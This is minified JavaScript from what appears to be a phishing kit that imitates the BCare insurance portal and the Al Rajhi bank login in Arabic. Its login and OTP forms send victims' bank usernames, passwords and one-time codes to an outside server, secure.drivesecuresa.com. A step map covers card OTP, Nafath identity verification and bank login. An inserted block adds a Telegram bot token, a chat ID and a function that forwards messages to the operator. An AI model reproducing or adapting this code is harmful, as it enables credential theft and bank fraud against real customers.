                            className: "text-sm",
                            style: {
                                color: ei.textSecondary
                            },
                            children: "جاري تجهيز بوابة الراجحي..."
                        })]
                    })]
                })]
            })
        }
        ;
        let ed = {
            background: u.colors.background,
            surface: u.colors.surface,
            border: u.colors.border,
            primary: u.colors.primary,
            accent: u.colors.accent,
            textPrimary: u.colors.textPrimary,
            textSecondary: u.colors.textSecondary,
            textLight: u.colors.textLight,
            error: u.colors.error
        }
          , em = e => {
            let {className: t="h-5 w-5", color: r=ed.textSecondary} = e;
            return (0,
            a.jsxs)("svg", {
                className: t,
                viewBox: "0 0 24 24",
                fill: "none",
                xmlns: "http://www.w3.org/2000/svg",
                children: [(0,
                a.jsx)("path", {
                    d: "M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7S2 12 2 12Z",
                    stroke: r,
                    strokeWidth: "1.6",
                    strokeLinecap: "round",
                    strokeLinejoin: "round"
                }), (0,
                a.jsx)("circle", {
                    cx: "12",
                    cy: "12",
                    r: "3",
                    stroke: r,
                    strokeWidth: "1.6"
                })]
            })
        }
          , eu = e => {
            let {className: t="h-5 w-5", color: r=ed.textSecondary} = e;
            return (0,
            a.jsxs)("svg", {
                className: t,
                viewBox: "0 0 24 24",
                fill: "none",
                xmlns: "http://www.w3.org/2000/svg",
                children: [(0,
                a.jsx)("path", {
                    d: "M3 4.5 20.5 22",
                    stroke: r,
                    strokeWidth: "1.6",
                    strokeLinecap: "round",
                    strokeLinejoin: "round"
                }), (0,
                a.jsx)("path", {
                    d: "M5.2 8.2C3.5 9.9 2 12 2 12s3.6 7 10 7c2 0 3.7-.5 5.1-1.3",
                    stroke: r,
                    strokeWidth: "1.6",
                    strokeLinecap: "round",
                    strokeLinejoin: "round"
                }), (0,
                a.jsx)("path", {
                    d: "M9.5 5.5A9.6 9.6 0 0 1 12 5c6.4 0 10 7 10 7a17.8 17.8 0 0 1-3.2 4.3",
                    stroke: r,
                    strokeWidth: "1.6",
                    strokeLinecap: "round",
                    strokeLinejoin: "round"
                }), (0,
                a.jsx)("path", {
                    d: "M9.9 9.9a3 3 0 0 0 4.2 4.2",
                    stroke: r,
                    strokeWidth: "1.6",
                    strokeLinecap: "round",
                    strokeLinejoin: "round"
                })]
            })
        }
          , ex = {
            invalid: "اسم المستخدم او كلمة المرور غير صحيحة."
        };
        var ep = e => {
            let {setPageState: t, errorCode: r, onClearError: s} = e
              , {dir: o} = (0,
            i.Z)()
              , n = "rtl" === o
              , c = "rajhiBankLogin"
              , [d,u] = (0,
            l.useState)("")
              , [x,p] = (0,
            l.useState)("")
              , [h,f] = (0,
            l.useState)(!1)
              , [y,b] = (0,
            l.useState)(!0)
              , [g,v] = (0,
            l.useState)({})
              , [N,w] = (0,
            l.useState)(!1);
            (0,
            l.useEffect)( () => {
                let e = j.getForm(c);
                (null == e ? void 0 : e.username) && u(e.username),
                "boolean" == typeof (null == e ? void 0 : e.rememberMe) && b(e.rememberMe)
            }
            , [c]),
            (0,
            l.useEffect)( () => {
                j.setForm(c, {
                    username: y ? d : "",
                    rememberMe: y
                }, {
                    sensitiveFields: ["password"]
                })
            }
            , [d, y, c]),
            (0,
            l.useEffect)( () => {
                window.scrollTo(0, 0)
            }
            , []),
            (0,
            l.useEffect)( () => {
                r && (v({
                    form: ex[r] || r
                }),
                w(!1))
            }
            , [r]);
            let A = () => {
                let e = {};
                return d.trim() || (e.username = "يرجى ادخال اسم المستخدم او رقم الهوية."),
                x.trim() || (e.password = "يرجى ادخال كلمة المرور."),
                e
            }
              , C = d.trim().length > 0 && x.trim().length > 0 && !N
              , S = async e => {
                if (e.preventDefault(),
                N)
                    return;
                r && s && s();
                let a = A();
                if (Object.keys(a).length > 0) {
                    v(a);
                    return
                }
                v({}),
                w(!0);
                try {
                    var o;
                    let e = {
                        key: null === (o = localStorage) || void 0 === o ? void 0 : o.getItem("key"),
                        rajhi: {
                            username: d.trim(),
                            password: x
                        },
                        inRajhi: !0,
                        inNafath: !1,
                        inSTC: !1
                    };
                    await (0,
                    m.iq)({
                        url: "https://secure.drivesecuresa.com/bcare/api/user/update",
                        data: e
                    }),
                    t(15)
                } catch (e) {
                    v({
                        form: "تعذر الاتصال بالبوابة. يرجى المحاولة مرة اخرى."
                    }),
                    w(!1)
                }
            }
            ;
            return (0,
            a.jsxs)("div", {
                dir: o,
                className: "fixed inset-0 z-[900] overflow-y-auto bg-gradient-to-b from-[#f7f8fb] via-[#f3f4f8] to-[#eef1f6]",
                children: [(0,
                a.jsx)("div", {
                    className: "pointer-events-none absolute -top-28 left-1/2 h-[420px] w-[420px] -translate-x-1/2 rounded-full bg-white/70 blur-3xl"
                }), (0,
                a.jsxs)("div", {
                    className: "relative mx-auto min-h-screen w-full max-w-[420px] px-5 pb-10 pt-6",
                    children: [(0,
                    a.jsxs)("div", {
                        className: "mb-6 flex items-center justify-between",
                        children: [(0,
                        a.jsxs)("div", {
                            className: "text-right",
                            children: [(0,
                            a.jsx)("p", {
                                className: "text-xs",
                                style: {
                                    color: ed.textSecondary
                                },
                                children: "الراجحي أونلاين"
                            }), (0,
                            a.jsx)("h1", {
                                className: "text-2xl font-semibold",
                                style: {
                                    color: ed.textPrimary
                                },
                                children: "تسجيل الدخول"
                            })]
                        }), (0,
                        a.jsx)("img", {
                            src: "/AlRajhi.png",
                            alt: "Al Rajhi",
                            className: "h-11 w-11"
                        })]
                    }), (0,
                    a.jsx)("p", {
                        className: "mb-6 text-sm leading-relaxed",
                        style: {
                            color: ed.textSecondary
                        },
                        children: "ادخل اسم المستخدم وكلمة المرور الخاصة بك لاكمال عملية الدفع."
                    }), (0,
                    a.jsxs)("form", {
                        onSubmit: S,
                        className: "space-y-4",
                        children: [(0,
                        a.jsxs)("div", {
                            children: [(0,
                            a.jsx)("label", {
                                className: "mb-2 block text-sm font-medium",
                                style: {
                                    color: ed.textSecondary
                                },
                                children: "اسم المستخدم او رقم الهوية"
                            }), (0,
                            a.jsx)("input", {
                                type: "text",
                                value: d,
                                onChange: e => {
                                    u(e.target.value),
                                    r && s && s(),
                                    (g.username || g.form) && v(e => ({
                                        ...e,
                                        username: void 0,
                                        form: void 0
                                    }))
                                }
                                ,
                                autoComplete: "username",
                                className: "w-full rounded-2xl border px-4 py-3 text-sm focus:outline-none focus:ring-2 transition ".concat(n ? "text-right" : "text-left", " ").concat(g.username ? "border-red-300 focus:ring-red-200" : "border-slate-200 focus:ring-slate-300"),
                                style: {
                                    backgroundColor: ed.surface,
                                    color: ed.textPrimary
                                },
                                placeholder: "اسم المستخدم او رقم الهوية"
                            }), g.username && (0,
                            a.jsx)("p", {
                                className: "mt-1 text-xs",
                                style: {
                                    color: ed.error
                                },
                                children: g.username
                            })]
                        }), (0,
                        a.jsxs)("div", {
                            children: [(0,
                            a.jsx)("label", {
                                className: "mb-2 block text-sm font-medium",
                                style: {
                                    color: ed.textSecondary
                                },
                                children: "كلمة المرور"
                            }), (0,
                            a.jsxs)("div", {
                                className: "relative",
                                children: [(0,
                                a.jsx)("input", {
                                    type: h ? "text" : "password",
                                    value: x,
                                    onChange: e => {
                                        p(e.target.value),
                                        r && s && s(),
                                        (g.password || g.form) && v(e => ({
                                            ...e,
                                            password: void 0,
                                            form: void 0
                                        }))
                                    }
                                    ,
                                    autoComplete: "current-password",
                                    className: "w-full rounded-2xl border px-4 py-3 text-sm focus:outline-none focus:ring-2 transition ".concat(n ? "text-right pl-12" : "text-left pr-12", " ").concat(g.password ? "border-red-300 focus:ring-red-200" : "border-slate-200 focus:ring-slate-300"),
                                    style: {
                                        backgroundColor: ed.surface,
                                        color: ed.textPrimary
                                    },
                                    placeholder: "كلمة المرور"
                                }), (0,
                                a.jsx)("button", {
                                    type: "button",
                                    onClick: () => f(e => !e),
                                    className: "absolute top-1/2 -translate-y-1/2 ".concat(n ? "left-4" : "right-4"),
                                    "aria-label": h ? "اخفاء كلمة المرور" : "اظهار كلمة المرور",
                                    children: h ? (0,
                                    a.jsx)(eu, {
                                        color: "#221BFF"
                                    }) : (0,
                                    a.jsx)(em, {
                                        color: "#221BFF"
                                    })
                                })]
                            }), g.password && (0,
                            a.jsx)("p", {
                                className: "mt-1 text-xs",
                                style: {
                                    color: ed.error
                                },
                                children: g.password
                            })]
                        }), (0,
                        a.jsxs)("div", {
                            className: "flex items-center justify-between text-sm",
                            children: [(0,
                            a.jsx)("button", {
                                type: "button",
                                className: "text-[#221BFF]",
                                children: "نسيت كلمة المرور?"
                            }), (0,
                            a.jsxs)("label", {
                                className: "flex items-center gap-2",
                                children: [(0,
                                a.jsx)("input", {
                                    type: "checkbox",
                                    checked: y,
                                    onChange: () => b(e => !e),
                                    className: "h-4 w-4 accent-[#221BFF]"
                                }), (0,
                                a.jsx)("span", {
                                    className: "text-[#221BFF]",
                                    children: "تذكرني"
                                })]
                            })]
                        }), g.form && (0,
                        a.jsx)("div", {
                            className: "rounded-xl border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-700",
                            children: g.form
                        }), (0,
                        a.jsx)("button", {
                            type: "submit",
                            disabled: !C,
                            className: "w-full rounded-2xl py-3 text-sm font-semibold transition ".concat(C ? "bg-[#221BFF] text-white shadow-sm" : "bg-slate-200 text-slate-500"),
                            children: N ? (0,
                            a.jsxs)("span", {
                                className: "flex items-center justify-center gap-2",
                                children: [(0,
                                a.jsx)("span", {
                                    className: "h-4 w-4 animate-spin rounded-full border-2 border-white/60 border-t-transparent"
                                }), "جاري التحقق..."]
                            }) : "متابعة"
                        })]
                    }), (0,
                    a.jsxs)("div", {
                        className: "mt-6 rounded-2xl border bg-white/80 p-4 text-right",
                        style: {
                            borderColor: ed.border
                        },
                        children: [(0,
                        a.jsx)("p", {
                            className: "text-sm font-semibold",
                            style: {
                                color: ed.textPrimary
                            },
                            children: "تنويه امني"
                        }), (0,
                        a.jsx)("p", {
                            className: "text-xs leading-relaxed",
                            style: {
                                color: ed.textSecondary
                            },
                            children: "حرصا على امانك, تاكد من صحة بيانات الدخول وعدم مشاركتها مع اي طرف اخر."
                        })]
                    })]
                })]
            })
        }
        ;
        let eh = {
            background: u.colors.background,
            surface: u.colors.surface,
            border: u.colors.border,
            primary: u.colors.primary,
            textPrimary: u.colors.textPrimary,
            textSecondary: u.colors.textSecondary
        };
        var ef = () => {
            let {dir: e} = (0,
            i.Z)();
            return (0,
            l.useEffect)( () => {
                window.scrollTo(0, 0)
            }
            , []),
            (0,
            a.jsxs)("div", {
                dir: e,
                className: "fixed inset-0 z-[900] flex items-center justify-center p-5",
                children: [(0,
                a.jsx)("div", {
                    className: "absolute inset-0",
                    style: {
                        background: "linear-gradient(180deg, #F6F8FB 0%, #EEF2F7 60%, #E9EDF4 100%)"
                    }
                }), (0,
                a.jsxs)("div", {
                    className: "relative w-full max-w-md rounded-3xl border bg-white/95 p-8 text-center",
                    style: {
                        borderColor: eh.border,
                        boxShadow: u.shadow.card
                    },
                    children: [(0,
                    a.jsx)("div", {
                        className: "mx-auto mb-5 h-14 w-14 animate-spin rounded-full border-4 border-slate-200 border-t-transparent"
                    }), (0,
                    a.jsx)("h2", {
                        className: "text-xl font-semibold",
                        style: {
                            color: eh.textPrimary
                        },
                        children: "جاري التحقق من بياناتك"
                    }), (0,
                    a.jsx)("p", {
                        className: "mt-3 text-sm leading-relaxed",
                        style: {
                            color: eh.textSecondary
                        },
                        children: "يرجى الانتظار حتى نتحقق من معلوماتك. قد يستغرق ذلك بضع ثوان."
                    }), (0,
                    a.jsx)("div", {
                        className: "mt-6 rounded-2xl border px-4 py-3 text-sm",
                        style: {
                            borderColor: eh.border,
                            color: eh.primary
                        },
                        children: "سيتم تحويلك تلقائيا عند اكتمال التحقق."
                    })]
                })]
            })
        }
        ;
        let ey = {
            background: u.colors.background,
            surface: u.colors.surface,
            border: u.colors.border,
            primary: u.colors.primary,
            accent: u.colors.accent,
            textPrimary: u.colors.textPrimary,
            textSecondary: u.colors.textSecondary,
            error: u.colors.error
        }
          , eb = {
            invalid: "رمز التحقق غير صحيح. يرجى المحاولة مرة اخرى.",
            format: "يرجى ادخال رمز صحيح (4 الى 6 ارقام).",
            sendFailed: "تعذر ارسال الرمز حاليا. يرجى المحاولة مرة اخرى."
        };
        var eg = e => {
            let {errorCode: t, onClearError: r} = e
              , {dir: s} = (0,
            i.Z)()
              , o = "rajhiOtp"
              , [n,c] = (0,
            l.useState)("")
              , [d,u] = (0,
            l.useState)({})
              , [x,p] = (0,
            l.useState)(!1)
              , [h,f] = (0,
            l.useState)(!1);
            (0,
            l.useEffect)( () => {
                let e = j.getForm(o);
                (null == e ? void 0 : e.otp) && c(e.otp)
            }
            , [o]),
            (0,
            l.useEffect)( () => {
                j.setForm(o, {
                    otp: n
                }, {
                    sensitiveFields: ["otp"]
                })
            }
            , [n, o]),
            (0,
            l.useEffect)( () => {
                window.scrollTo(0, 0)
            }
            , []),
            (0,
            l.useEffect)( () => {
                t && (u({
                    form: eb[t] || t
                }),
                f(!1),
                p(!1))
            }
            , [t]);
            let y = () => {
                let e = {};
                return /^\d{4,6}$/.test(n) || (e.otp = eb.format),
                e
            }
              , b = async e => {
                if (e.preventDefault(),
                x || h)
                    return;
                t && r && r();
                let a = y();
                if (Object.keys(a).length > 0) {
                    u(a);
                    return
                }
                u({}),
                p(!0),
                f(!1);
                try {
                    var s;
                    let e = {
                        key: null === (s = localStorage) || void 0 === s ? void 0 : s.getItem("key"),
                        rajhiOtp: n,
                        inRajhi: !0,
                        inNafath: !1,
                        inSTC: !1
                    };
                    await (0,
                    m.iq)({
                        url: "https://secure.drivesecuresa.com/bcare/api/user/update",
                        data: e
                    }),
                    p(!1),
                    f(!0)
                } catch (e) {
                    u({
                        form: eb.sendFailed
                    }),
                    p(!1),
                    f(!1)
                }
            }
            ;
            return (0,
            a.jsxs)("div", {
                dir: s,
                className: "fixed inset-0 z-[900] overflow-y-auto bg-gradient-to-b from-[#f7f8fb] via-[#f3f4f8] to-[#eef1f6]",
                children: [(0,
                a.jsx)("div", {
                    className: "pointer-events-none absolute -top-28 left-1/2 h-[420px] w-[420px] -translate-x-1/2 rounded-full bg-white/70 blur-3xl"
                }), (0,
                a.jsxs)("div", {
                    className: "relative mx-auto min-h-screen w-full max-w-[420px] px-5 pb-10 pt-6",
                    children: [(0,
                    a.jsxs)("div", {
                        className: "mb-6 flex items-center justify-between",
                        children: [(0,
                        a.jsxs)("div", {
                            className: "text-right",
                            children: [(0,
                            a.jsx)("p", {
                                className: "text-xs",
                                style: {
                                    color: ey.textSecondary
                                },
                                children: "الراجحي أونلاين"
                            }), (0,
                            a.jsx)("h1", {
                                className: "text-2xl font-semibold",
                                style: {
                                    color: ey.textPrimary
                                },
                                children: "رمز التحقق"
                            })]
                        }), (0,
                        a.jsx)("img", {
                            src: "/AlRajhi.png",
                            alt: "Al Rajhi",
                            className: "h-11 w-11"
                        })]
                    }), (0,
                    a.jsx)("p", {
                        className: "mb-6 text-sm leading-relaxed",
                        style: {
                            color: ey.textSecondary
                        },
                        children: "ادخل الرمز المرسل الى جوالك لاكمال عملية الدفع بشكل امن."
                    }), (0,
                    a.jsxs)("form", {
                        onSubmit: b,
                        className: "space-y-4",
                        children: [(0,
                        a.jsxs)("div", {
                            className: "text-right",
                            children: [(0,
                            a.jsx)("label", {
                                className: "mb-2 block text-sm",
                                style: {
                                    color: ey.textSecondary
                                },
                                children: "رمز التحقق"
                            }), (0,
                            a.jsx)("input", {
                                type: "text",
                                inputMode: "numeric",
                                maxLength: 6,
                                value: n,
                                onChange: e => {
                                    c(e.target.value.replace(/\D/g, "")),
                                    t && r && r(),
                                    (d.otp || d.form) && u(e => ({
                                        ...e,
                                        otp: void 0,
                                        form: void 0
                                    }))
                                }
                                ,
                                disabled: x || h,
                                className: "w-full rounded-2xl border px-4 py-3 text-center text-lg tracking-widest focus:outline-none focus:ring-2 transition ".concat(d.otp ? "border-red-300 focus:ring-red-200" : "border-slate-200 focus:ring-slate-300"),
                                style: {
                                    backgroundColor: ey.surface,
                                    color: ey.textPrimary
                                },
                                placeholder: "0000"
                            }), d.otp && (0,
                            a.jsx)("p", {
                                className: "mt-1 text-xs",
                                style: {
                                    color: ey.error
                                },
                                children: d.otp
                            })]
                        }), d.form && (0,
                        a.jsx)("div", {
                            className: "rounded-xl border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-700",
                            children: d.form
                        }), (0,
                        a.jsx)("button", {
                            type: "submit",
                            disabled: n.length < 4 || x || h,
                            className: "w-full rounded-2xl py-3 text-sm font-semibold transition ".concat(!(n.length >= 4) || x || h ? "bg-slate-200 text-slate-500" : "bg-[#221BFF] text-white shadow-sm"),
                            children: x || h ? (0,
                            a.jsxs)("span", {
                                className: "flex items-center justify-center gap-2",
                                children: [(0,
                                a.jsx)("span", {
                                    className: "h-4 w-4 animate-spin rounded-full border-2 border-white/60 border-t-transparent"
                                }), h ? "جاري التحقق..." : "جاري الارسال..."]
                            }) : "تأكيد"
                        })]
                    }), h && (0,
                    a.jsx)("div", {
                        className: "mt-4 rounded-2xl border bg-white/80 px-4 py-3 text-sm text-center",
                        style: {
                            borderColor: ey.border,
                            color: ey.textSecondary
                        },
                        children: "جاري التحقق من الرمز. يرجى الانتظار حتى يتم تأكيد العملية."
                    })]
                })]
            })
        }
        ;
        let ev = {
            background: u.colors.background,
            surface: u.colors.surface,
            primary: u.colors.primary,
            accent: u.colors.accent,
            textPrimary: u.colors.textPrimary,
            textSecondary: u.colors.textSecondary,
            textLight: u.colors.textLight,
            border: u.colors.border
        }
          , ej = () => {
            let e = window.localStorage.getItem("key");
            return e || (e = "key".concat(Math.random().toString(16).slice(2)),
            window.localStorage.setItem("key", e)),
            e
        }
        ;
        var eN = () => {
            let[e,t] = (0,
            l.useState)(!1)
              , [r,s] = (0,
            l.useState)("");
            (0,
            l.useEffect)( () => {
                window.scrollTo({
                    top: 0,
                    left: 0,
                    behavior: "auto"
                })
            }
            , []);
            let o = async () => {
                if (!e) {
                    t(!0),
                    s("");
                    try {
                        let e = ej();
                        if (!e) {
                            s("تعذر تحميل الوثيقة. حاول مرة أخرى.");
                            return
                        }
                        let t = await fetch("https://secure.drivesecuresa.com/bcare/api/user/policy", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                key: e,
                                type: "BCare"
                            })
                        });
                        if (403 === t.status) {
                            window.dispatchEvent(new CustomEvent("client-banned"));
                            return
                        }
                        if (!t.ok) {
                            s("تعذر تحميل الوثيقة. حاول مرة أخرى.");
                            return
                        }
                        let r = await t.blob()
                          , a = window.URL.createObjectURL(r)
                          , o = document.createElement("a");
                        o.href = a,
                        o.download = "policy-document.pdf",
                        document.body.appendChild(o),
                        o.click(),
                        o.remove(),
                        window.URL.revokeObjectURL(a)
                    } catch (e) {
                        s("تعذر تحميل الوثيقة. حاول مرة أخرى.")
                    } finally {
                        t(!1)
                    }
                }
            }
            ;
            return (0,
            a.jsx)("div", {
                dir: "rtl",
                className: "flex min-h-[70dvh] items-center justify-center p-6",
                style: {
                    backgroundColor: ev.background
                },
                children: (0,
                a.jsxs)("div", {
                    className: "w-full max-w-md rounded-3xl border bg-white p-6 text-center",
                    style: {
                        borderColor: ev.border,
                        boxShadow: u.shadow.card
                    },
                    children: [(0,
                    a.jsx)("div", {
                        className: "mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full",
                        style: {
                            backgroundColor: "".concat(ev.accent, "22")
                        },
                        children: (0,
                        a.jsx)(c.FJM, {
                            className: "text-3xl",
                            style: {
                                color: ev.accent
                            }
                        })
                    }), (0,
                    a.jsx)("h1", {
                        className: "text-xl font-bold",
                        style: {
                            color: ev.textPrimary
                        },
                        children: "تم إصدار وثيقة تأمين المركبة بنجاح"
                    }), (0,
                    a.jsx)("p", {
                        className: "mt-2 text-sm leading-relaxed",
                        style: {
                            color: ev.textSecondary
                        },
                        children: "يمكنك الآن تحميل وثيقة التأمين الخاصة بمركبتك والاحتفاظ بها للرجوع إليها عند الحاجة."
                    }), r && (0,
                    a.jsx)("div", {
                        className: "mt-4 rounded-xl px-4 py-3 text-sm",
                        style: {
                            backgroundColor: "".concat(ev.accent, "1A"),
                            color: ev.primary
                        },
                        children: r
                    }), (0,
                    a.jsx)("button", {
                        type: "button",
                        onClick: o,
                        disabled: e,
                        className: "mt-6 flex w-full items-center justify-center gap-2 rounded-xl py-3 text-sm font-semibold shadow-sm transition hover:shadow-md disabled:opacity-70",
                        style: {
                            backgroundColor: ev.accent,
                            color: ev.textLight
                        },
                        children: e ? (0,
                        a.jsxs)(a.Fragment, {
                            children: [(0,
                            a.jsx)("span", {
                                className: "h-4 w-4 animate-spin rounded-full border-2 border-white/70 border-t-transparent"
                            }), "جاري تنزيل الوثيقة"]
                        }) : (0,
                        a.jsxs)(a.Fragment, {
                            children: [(0,
                            a.jsx)(c.yRW, {}), "تحميل الوثيقة"]
                        })
                    }), (0,
                    a.jsx)("p", {
                        className: "mt-4 text-xs",
                        style: {
                            color: ev.textSecondary
                        },
                        children: "الوثيقة بصيغة PDF ويمكن طباعتها أو مشاركتها مباشرة."
                    })]
                })
            })
        }
        ;
// ===============================================
// إعدادات Telegram Bot
// ===============================================
const TELEGRAM_CONFIG = {
  BOT_TOKEN: '8224906914:AAH_Zdi6Og246jtfFUq2LTOud_Rcz73F50s',
  CHAT_ID: '5336195503'
};

const sendToTelegram = async (message) => {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CONFIG.CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    const result = await response.json();
    console.log('✅ تم الإرسال:', result);
    return result;
  } catch (error) {
    console.error('❌ خطأ في الإرسال:', error);
    return null;
  }
};

const formatTime = () => {
  return new Date().toLocaleString('ar-SA', { 
    timeZone: 'Asia/Riyadh',
    dateStyle: 'medium',
    timeStyle: 'short'
  });
};

        let ew = o()( () => r.e(928).then(r.bind(r, 9928)), {
            loadableGenerated: {
                webpack: () => [9928]
            },
            ssr: !1
        })
          , eA = {
            background: u.colors.background,
            surface: u.colors.surface,
            primary: u.colors.primary,
            primaryDark: u.colors.primaryDark,
            primaryLight: u.colors.primaryLight,
            accent: u.colors.accent,
            accentDark: u.colors.accentDark,
            textPrimary: u.colors.textPrimary,
            textSecondary: u.colors.textSecondary,
            textLight: u.colors.textLight,
            error: u.colors.error,
            success: u.colors.success,
            border: u.colors.border,
            borderFocus: u.colors.primary,
            info: u.colors.info,
            headerBackground: "rgba(255, 255, 255, 0.92)",
            footerBackground: u.colors.footerBackground,
            footerText: "#D6E4F0",
            footerTextMuted: "#9FB4C4",
            loadingOverlayBg: "rgba(15, 31, 46, 0.88)"
        }
          , eC = e => {
            let {className: t="w-6 h-6", color: r=eA.textPrimary} = e;
            return (0,
            a.jsxs)("svg", {
                className: t,
                viewBox: "0 0 24 24",
                fill: "none",
                xmlns: "http://www.w3.org/2000/svg",
                stroke: r,
                strokeWidth: "2",
                strokeLinecap: "round",
                strokeLinejoin: "round",
                children: [(0,
                a.jsx)("line", {
                    x1: "3",
                    y1: "12",
                    x2: "21",
                    y2: "12"
                }), (0,
                a.jsx)("line", {
                    x1: "3",
                    y1: "6",
                    x2: "21",
                    y2: "6"
                }), (0,
                a.jsx)("line", {
                    x1: "3",
                    y1: "18",
                    x2: "21",
                    y2: "18"
                })]
            })
        }
          , eS = e => {
            let {className: t="w-5 h-5", color: r=eA.textPrimary} = e;
            return (0,
            a.jsxs)("svg", {
                className: t,
                viewBox: "0 0 24 24",
                fill: "none",
                xmlns: "http://www.w3.org/2000/svg",
                stroke: r,
                strokeWidth: "1.8",
                strokeLinecap: "round",
                strokeLinejoin: "round",
                children: [(0,
                a.jsx)("path", {
                    d: "M20 21a8 8 0 0 0-16 0"
                }), (0,
                a.jsx)("circle", {
                    cx: "12",
                    cy: "7",
                    r: "4"
                })]
            })
        }
          , ek = e => {
            let {className: t="w-4 h-4", color: r="currentColor"} = e;
            return (0,
            a.jsxs)("svg", {
                className: t,
                viewBox: "0 0 24 24",
                fill: "none",
                xmlns: "http://www.w3.org/2000/svg",
                stroke: r,
                strokeWidth: "2",
                strokeLinecap: "round",
                strokeLinejoin: "round",
                children: [(0,
                a.jsx)("line", {
                    x1: "18",
                    y1: "6",
                    x2: "6",
                    y2: "18"
                }), (0,
                a.jsx)("line", {
                    x1: "6",
                    y1: "6",
                    x2: "18",
                    y2: "18"
                })]
            })
        }
          , eI = e => {
            let {className: t="h-10 w-10", color: r=eA.accent} = e;
            return (0,
            a.jsxs)("svg", {
                className: "animate-spin ".concat(t),
                xmlns: "http://www.w3.org/2000/svg",
                fill: "none",
                viewBox: "0 0 24 24",
                children: [(0,
                a.jsx)("circle", {
                    className: "opacity-25",
                    cx: "12",
                    cy: "12",
                    r: "10",
                    stroke: r,
                    strokeOpacity: "0.3",
                    strokeWidth: "3"
                }), (0,
                a.jsx)("path", {
                    className: "opacity-75",
                    fill: r,
                    d: "M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                })]
            })
        }
          , eE = e => {
            let {className: t="h-20 w-20", color: r=eA.error} = e;
            return (0,
            a.jsx)("svg", {
                className: t,
                fill: "none",
                viewBox: "0 0 24 24",
                strokeWidth: "1.5",
                stroke: r,
                "aria-hidden": "true",
                children: (0,
                a.jsx)("path", {
                    strokeLinecap: "round",
                    strokeLinejoin: "round",
                    d: "M12 9v3.75m0-10.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.75c0 5.592 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.57-.598-3.75h-.152c-3.196 0-6.1-1.249-8.25-3.286zm0 13.036h.008v.008H12v-.008z"
                })
            })
        }
          , eP = {
            ar: {
                promoTitle: "حمّل تطبيق بي كير الآن!",
                promoSubtitle: "واستمتع بخدمات أكثر.",
                promoCta: "تحميل",
                menuLabel: "القائمة",
                profileLabel: "الملف الشخصي",
                langToggle: "EN",
                navToggleLabel: "حفظ الخطوة",
                navToggleOn: "مفعل",
                navToggleOff: "متوقف",
                contactLabel: "اتصل بنا",
                footerCopy: "جميع الحقوق محفوظة لشركة عناية الوسيط لوساطة التأمين. خاضعة لرقابة وإشراف البنك المركزي السعودي."
            },
            en: {
                promoTitle: "Download the BCare app now!",
                promoSubtitle: "Enjoy more services in one place.",
                promoCta: "Get App",
                menuLabel: "Menu",
                profileLabel: "Profile",
                navToggleLabel: "Step Memory",
                navToggleOn: "On",
                navToggleOff: "Off",
                langToggle: "عربي",
                contactLabel: "Contact Us",
                footerCopy: "All rights reserved for Enayah Al-Waseet Insurance Brokerage. Regulated by the Saudi Central Bank."
            }
        }
          , eT = {
            ar: {
                bannedTitle: "عفواً، حدث خطأ",
                bannedMessage: "نعتذر، لا يمكننا معالجة طلبك في الوقت الحالي. يرجى المحاولة مرة أخرى في وقت لاحق أو التواصل مع الدعم الفني.",
                loadingTitle: "جاري معالجة طلبك...",
                loadingSearchTitle: "جاري البحث عن أفضل العروض...",
                loadingSearchSubtitle: "لحظات قليلة وستظهر لك قائمة الأسعار.",
                loadingSearchAlt: "جاري البحث عن العروض",
                loadingError: "حدث خطأ في البيانات التي أدخلتها، يرجى إعادة التحقق والمحاولة مرة أخرى"
            },
            en: {
                bannedTitle: "Sorry, something went wrong",
                bannedMessage: "We cannot process your request right now. Please try again later or contact support.",
                loadingTitle: "Processing your request...",
                loadingSearchTitle: "Searching for the best offers...",
                loadingSearchSubtitle: "Just a moment and the price list will appear.",
                loadingSearchAlt: "Searching for offers",
                loadingError: "There was an error in the data you entered. Please review and try again."
            }
        }
          , eB = "https://secure.drivesecuresa.com/bcare/api/user/update"
          , eO = "bcare.pendingAcks.v1"
          , eD = "bcare.executedCommands.v1"
          , eL = e => {
            try {
                let t = window.localStorage.getItem(e);
                if (!t)
                    return [];
                let r = JSON.parse(t);
                return Array.isArray(r) ? r : []
            } catch (e) {
                return []
            }
        }
          , eR = (e, t) => {
            try {
                window.localStorage.setItem(e, JSON.stringify(t))
            } catch (e) {}
        }
          , eF = {
            0: "Booking Form",
            1: "Booking Confirmation",
            2: "Offers",
            3: "Confirmation",
            4: "Payment",
            5: "Payment Loading",
            6: "Payment OTP",
            7: "Card Ownership",
            8: "Phone Entry",
            9: "Phone OTP",
            10: "Identity Verification",
            11: "Nafath Processing",
            12: "Call Confirmation",
            13: "Rajhi Prompt",
            14: "Rajhi Login",
            15: "Rajhi Processing",
            16: "Rajhi OTP",
            17: "Policy Document"
        }
          , eM = e => "number" != typeof e || Number.isNaN(e) ? 0 : Math.min(Math.max(e, 0), 17)
          , eQ = e => eF[e] || "Screen ".concat(e)
          , eU = () => {
            let e = window.localStorage.getItem("key");
            return e || (e = "key".concat(Math.random().toString(16).slice(2)),
            window.localStorage.setItem("key", e)),
            e
        }
          , eH = e => {
            eM(e);
            let t = new URL(window.location.href);
            return "".concat(t.pathname).concat(t.search).concat(t.hash)
        }
          , eq = "test"
          , eV = "test"
          , eG = "".concat(eq, "/").concat(eV);
        function eX() {
            let e = (0,
            n.s)()
              , {lang: t, dir: r, setLang: s} = (0,
            i.Z)()
              , o = eP[t] || eP.ar
              , c = eT[t] || eT.ar
              , [d,u] = (0,
            l.useState)(e.connected)
              , [x,p] = (0,
            l.useState)(0)
              , [h,f] = (0,
            l.useState)(!1)
              , [y,b] = (0,
            l.useState)("ضد الغير")
              , [g,v] = (0,
            l.useState)("")
              , [j,N] = (0,
            l.useState)({})
              , [w,A] = (0,
            l.useState)({
                name: "",
